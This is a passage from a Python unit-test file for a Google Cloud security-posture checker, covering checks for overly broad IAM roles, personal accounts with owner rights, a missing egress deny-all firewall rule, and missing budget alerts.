        assert "allUsers" in findings[0].evidence["broad_members"]

    def test_fail_when_compute_admin_granted_to_domain(self) -> None:
        """roles/compute.admin granted to domain: → FAIL."""
        binding = IAMBinding(
            resource="projects/test-project",
            resource_type="cloudresourcemanager.googleapis.com/Project",
            project_id="test-project",
            role="roles/compute.admin",
            members=["domain:example.com"],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[binding],
        )
        check = CM040BroadComputeCreationRoles()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert "domain:example.com" in findings[0].evidence["broad_members"]

    def test_fail_when_compute_admin_granted_to_many_members(self) -> None:
        """roles/compute.admin granted to > 3 specific members → FAIL."""
        binding = IAMBinding(
            resource="projects/test-project",
            resource_type="cloudresourcemanager.googleapis.com/Project",
            project_id="test-project",
            role="roles/compute.admin",
            members=[
                "user:a@example.com",
                "user:b@example.com",
                "user:c@example.com",
                "user:d@example.com",
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[binding],
        )
        check = CM040BroadComputeCreationRoles()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-040"

    def test_pass_when_compute_admin_restricted(self) -> None:
        """roles/compute.admin granted to ≤ 3 specific users → PASS."""
        binding = IAMBinding(
            resource="projects/test-project",
            resource_type="cloudresourcemanager.googleapis.com/Project",
            project_id="test-project",
            role="roles/compute.admin",
            members=[
                "user:admin@example.com",
                "serviceAccount:deploy-sa@test-project.iam.gserviceaccount.com",
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[binding],
        )
        check = CM040BroadComputeCreationRoles()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_non_compute_role(self) -> None:
        """Non-compute role granted broadly → PASS (not in scope)."""
        binding = IAMBinding(
            resource="projects/test-project",
            resource_type="cloudresourcemanager.googleapis.com/Project",
            project_id="test-project",
            role="roles/viewer",
            members=["allUsers"],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[binding],
        )
        check = CM040BroadComputeCreationRoles()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-042: Token creator granted to domain
# ---------------------------------------------------------------------------


class TestCM042BroadServiceAccountActAs:
    def test_fail_when_token_creator_granted_to_domain(self) -> None:
        """roles/iam.serviceAccountTokenCreator granted to domain: → FAIL."""
        binding = IAMBinding(
            resource="projects/test-project",
            resource_type="cloudresourcemanager.googleapis.com/Project",
            project_id="test-project",
            role="roles/iam.serviceAccountTokenCreator",
            members=["domain:evil.com"],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[binding],
        )
        check = CM042BroadServiceAccountActAs()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-042"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
        assert "domain:evil.com" in findings[0].evidence["broad_members"]

    def test_fail_when_token_creator_granted_to_group(self) -> None:
        """roles/iam.serviceAccountTokenCreator granted to group: → FAIL."""
        binding = IAMBinding(
            resource="projects/test-project",
            resource_type="cloudresourcemanager.googleapis.com/Project",
            project_id="test-project",
            role="roles/iam.serviceAccountTokenCreator",
            members=["group:all-devs@example.com"],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[binding],
        )
        check = CM042BroadServiceAccountActAs()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert "group:all-devs@example.com" in findings[0].evidence["broad_members"]

    def test_pass_when_token_creator_restricted(self) -> None:
        """roles/iam.serviceAccountTokenCreator granted to specific SA → PASS."""
        binding = IAMBinding(
            resource="projects/test-project",
            resource_type="cloudresourcemanager.googleapis.com/Project",
            project_id="test-project",
            role="roles/iam.serviceAccountTokenCreator",
            members=["serviceAccount:ci-sa@test-project.iam.gserviceaccount.com"],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[binding],
        )
        check = CM042BroadServiceAccountActAs()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_service_account_user_restricted(self) -> None:
        """roles/iam.serviceAccountUser granted to specific user → PASS."""
        binding = IAMBinding(
            resource="projects/test-project",
            resource_type="cloudresourcemanager.googleapis.com/Project",
            project_id="test-project",
            role="roles/iam.serviceAccountUser",
            members=["user:admin@example.com"],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[binding],
        )
        check = CM042BroadServiceAccountActAs()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-045: IAM Recommender compute insight
# ---------------------------------------------------------------------------


class TestCM045RecommenderOverpermissionedSA:
    def test_fail_when_recommender_has_compute_insight(self) -> None:
        """Recommender insight with REMOVE_ROLE and compute role → FAIL."""
        insight = {
            "name": "projects/test-project/locations/global/recommenders/google.iam.policy.Recommender/recommendations/rec-001",
            "project_id": "test-project",
            "recommender_subtype": "REMOVE_ROLE",
            "description": "Remove role roles/compute.admin from service account sa@test-project.iam.gserviceaccount.com",
            "content": {"role": "roles/compute.admin"},
            "priority": "P1",
        }
        inventory = ResourceInventory(
            project_ids=["test-project"],
            recommender_insights=[insight],
        )
        check = CM045RecommenderOverpermissionedSA()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-045"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.MEDIUM
        assert findings[0].evidence["recommender_subtype"] == "REMOVE_ROLE"

    def test_fail_when_recommender_has_replace_role_with_container(self) -> None:
        """Recommender insight with REPLACE_ROLE and container role → FAIL."""
        insight = {
            "name": "projects/test-project/locations/global/recommenders/google.iam.policy.Recommender/recommendations/rec-002",
            "project_id": "test-project",
            "recommender_subtype": "REPLACE_ROLE",
            "description": "Replace roles/container.admin with a more restrictive role",
            "content": {"role": "roles/container.admin"},
            "priority": "P2",
        }
        inventory = ResourceInventory(
            project_ids=["test-project"],
            recommender_insights=[insight],
        )
        check = CM045RecommenderOverpermissionedSA()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-045"

    def test_pass_when_no_relevant_insights(self) -> None:
        """Recommender insight for non-compute role → PASS."""
        insight = {
            "name": "projects/test-project/locations/global/recommenders/google.iam.policy.Recommender/recommendations/rec-003",
            "project_id": "test-project",
            "recommender_subtype": "REMOVE_ROLE",
            "description": "Remove role roles/storage.admin from service account",
            "content": {"role": "roles/storage.admin"},
            "priority": "P3",
        }
        inventory = ResourceInventory(
            project_ids=["test-project"],
            recommender_insights=[insight],
        )
        check = CM045RecommenderOverpermissionedSA()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_wrong_subtype(self) -> None:
        """Recommender insight with non-REMOVE/REPLACE subtype → PASS."""
        insight = {
            "name": "projects/test-project/locations/global/recommenders/google.iam.policy.Recommender/recommendations/rec-004",
            "project_id": "test-project",
            "recommender_subtype": "ADD_ROLE",
            "description": "Add role roles/compute.viewer to service account",
            "content": {"role": "roles/compute.viewer"},
            "priority": "P4",
        }
        inventory = ResourceInventory(
            project_ids=["test-project"],
            recommender_insights=[insight],
        )
        check = CM045RecommenderOverpermissionedSA()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_no_insights(self) -> None:
        """No recommender insights → PASS."""
        inventory = ResourceInventory(
            project_ids=["test-project"],
            recommender_insights=[],
        )
        check = CM045RecommenderOverpermissionedSA()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-046: personal account with Owner/Editor
# ---------------------------------------------------------------------------


def _binding(role: str = "roles/owner", members: list[str] | None = None) -> IAMBinding:
    return IAMBinding(
        resource="//cloudresourcemanager.googleapis.com/projects/test-project",
        resource_type="cloudresourcemanager.googleapis.com/Project",
        project_id="test-project",
        role=role,
        members=members if members is not None else ["user:someone@gmail.com"],
    )


class TestCM046PersonalAccountPrivilegedRole:
    def test_fail_when_gmail_account_is_owner(self) -> None:
        inventory = ResourceInventory(project_ids=["test-project"], iam_bindings=[_binding()])
        findings = CM046PersonalAccountPrivilegedRole().evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-046"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.CRITICAL
        assert findings[0].evidence["member"] == "user:someone@gmail.com"
        assert findings[0].evidence["email_domain"] == "gmail.com"

    def test_fail_when_personal_account_is_editor(self) -> None:
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[_binding("roles/editor", ["user:contractor@proton.me"])],
        )
        findings = CM046PersonalAccountPrivilegedRole().evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].evidence["role"] == "roles/editor"

    def test_fail_for_each_personal_member(self) -> None:
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[
                _binding(
                    members=[
                        "user:a@gmail.com",
                        "user:b@yahoo.com",
                        "user:managed@corp.example",
                        "serviceAccount:sa@test-project.iam.gserviceaccount.com",
                    ]
                )
            ],
        )
        findings = CM046PersonalAccountPrivilegedRole().evaluate(inventory)
        assert len(findings) == 2
        assert {f.evidence["member"] for f in findings} == {"user:a@gmail.com", "user:b@yahoo.com"}
        assert len({f.finding_id for f in findings}) == 2

    def test_pass_when_managed_account_is_owner(self) -> None:
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[
                _binding(members=["user:admin@corp.example", "group:admins@corp.example"])
            ],
        )
        assert CM046PersonalAccountPrivilegedRole().evaluate(inventory) == []

    def test_pass_when_personal_account_has_non_privileged_role(self) -> None:
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[_binding("roles/viewer", ["user:someone@gmail.com"])],
        )
        assert CM046PersonalAccountPrivilegedRole().evaluate(inventory) == []

    def test_pass_when_domain_lookalike_is_not_consumer(self) -> None:
        """A corporate domain that merely contains 'gmail.com' must not match."""
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[_binding(members=["user:admin@notgmail.com", "user:x@corp.example"])],
        )
        assert CM046PersonalAccountPrivilegedRole().evaluate(inventory) == []

    def test_pass_on_malformed_members(self) -> None:
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[_binding(members=["user:", "user:no-at-sign", "domain:corp.example"])],
        )
        assert CM046PersonalAccountPrivilegedRole().evaluate(inventory) == []

    def test_removal_command_targets_the_personal_member(self) -> None:
        inventory = ResourceInventory(project_ids=["test-project"], iam_bindings=[_binding()])
        finding = CM046PersonalAccountPrivilegedRole().evaluate(inventory)[0]
        assert any(
            "remove-iam-policy-binding" in cmd and "user:someone@gmail.com" in cmd
            for cmd in finding.remediation.gcloud_commands
        )


# ---------------------------------------------------------------------------
# CM-060: budget alerts (and the unreadable-budget guard)
# ---------------------------------------------------------------------------


class TestCM060UnreadableBudgets:
    def test_no_finding_when_budgets_could_not_be_read(self) -> None:
        """The budgets API was disabled → CM-060 must not claim there are no budgets."""
        inventory = ResourceInventory(
            project_ids=["test-project"],
            budgets=[],
            budgets_unreadable=["ACCT-1"],
        )
        assert CM060NoBudgetAlert().evaluate(inventory) == []

    def test_still_fails_when_budgets_were_readable(self) -> None:
        inventory = ResourceInventory(project_ids=["test-project"], budgets=[])
        findings = CM060NoBudgetAlert().evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-060"


# ---------------------------------------------------------------------------
# CM-050: No egress deny-all rule
# ---------------------------------------------------------------------------


class TestCM050NoEgressRestriction:
    def test_fail_when_no_egress_deny_rule(self) -> None:
        """Project with firewall rules but no egress deny-all → FAIL."""
        rule = FirewallRule(
            name="allow-internal",
            project_id="test-project",
            network="default",
            direction="INGRESS",
            priority=1000,
            source_ranges=["10.0.0.0/8"],
            allowed=[{"IPProtocol": "all"}],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            firewall_rules=[rule],
        )
        check = CM050NoEgressRestriction()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-050"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
        assert findings[0].evidence["project_id"] == "test-project"

    def test_fail_when_egress_deny_rule_has_low_priority(self) -> None:
        """Egress deny rule with priority < 65000 → FAIL (not a catch-all)."""
        rule = FirewallRule(
            name="deny-egress-low-priority",
            project_id="test-project",
            network="default",
            direction="EGRESS",
            priority=1000,  # too low to be a catch-all
            destination_ranges=["0.0.0.0/0"],
            denied=[{"IPProtocol": "all"}],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            firewall_rules=[rule],
        )
        check = CM050NoEgressRestriction()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-050"

    def test_pass_when_egress_deny_all_exists(self) -> None:
        """Project with a valid egress deny-all rule (priority >= 65000) → PASS."""
        rule = FirewallRule(
            name="deny-all-egress",
            project_id="test-project",
            network="default",
            direction="EGRESS",
            priority=65534,
            destination_ranges=["0.0.0.0/0"],
            denied=[{"IPProtocol": "all"}],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            firewall_rules=[rule],
        )
        check = CM050NoEgressRestriction()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_no_firewall_rules(self) -> None:
        """No firewall rules at all → no projects to evaluate → PASS."""
        inventory = ResourceInventory(
            project_ids=["test-project"],
            firewall_rules=[],
        )
        check = CM050NoEgressRestriction()
        findings = check.evaluate(inventory)
        # No rules means no projects in rules_by_project → no findings
        assert findings == []


# ---------------------------------------------------------------------------
# CM-060: No budget or budget alert
# ---------------------------------------------------------------------------


class TestCM060NoBudgetAlert:
    def test_fail_when_no_budgets(self) -> None:
        """No budgets configured → FAIL."""
        inventory = ResourceInventory(
            project_ids=["test-project"],
            budgets=[],
        )
        check = CM060NoBudgetAlert()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-060"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
        assert findings[0].evidence["budgets"] == []

    def test_fail_when_budget_has_no_threshold_rules(self) -> None:
        """Budget exists but has no threshold rules → FAIL."""
        budget = BudgetInfo(
            name="billingAccounts/123/budgets/budget-001",
            billing_account_id="123456",
            display_name="Monthly Budget",
            amount={"specifiedAmount": {"currencyCode": "USD", "units": "1000"}},
            threshold_rules=[],  # no alerts
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            budgets=[budget],
        )
        check = CM060NoBudgetAlert()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-060"
        assert findings[0].evidence["budget_name"] == "billingAccounts/123/budgets/budget-001"

    def test_pass_when_budget_with_alerts_exists(self) -> None:
        """Budget with threshold rules configured → PASS."""
        budget = BudgetInfo(
            name="billingAccounts/123/budgets/budget-002",
            billing_account_id="123456",
            display_name="Monthly Budget with Alerts",
            amount={"specifiedAmount": {"currencyCode": "USD", "units": "1000"}},
            threshold_rules=[
                {"thresholdPercent": 0.5, "spendBasis": "CURRENT_SPEND"},
                {"thresholdPercent": 0.9, "spendBasis": "CURRENT_SPEND"},
                {"thresholdPercent": 1.0, "spendBasis": "CURRENT_SPEND"},
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            budgets=[budget],
        )
        check = CM060NoBudgetAlert()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_multiple_budgets_all_have_alerts(self) -> None:
        """Multiple budgets all with threshold rules → PASS."""
        budgets = [
            BudgetInfo(
                name=f"billingAccounts/123/budgets/budget-{i}",
                billing_account_id="123456",
                display_name=f"Budget {i}",
                threshold_rules=[{"thresholdPercent": 0.9}],
            )
            for i in range(3)
        ]
        inventory = ResourceInventory(
            project_ids=["test-project"],
            budgets=budgets,
        )
        check = CM060NoBudgetAlert()
        findings = check.evaluate(inventory)
        assert findings == []
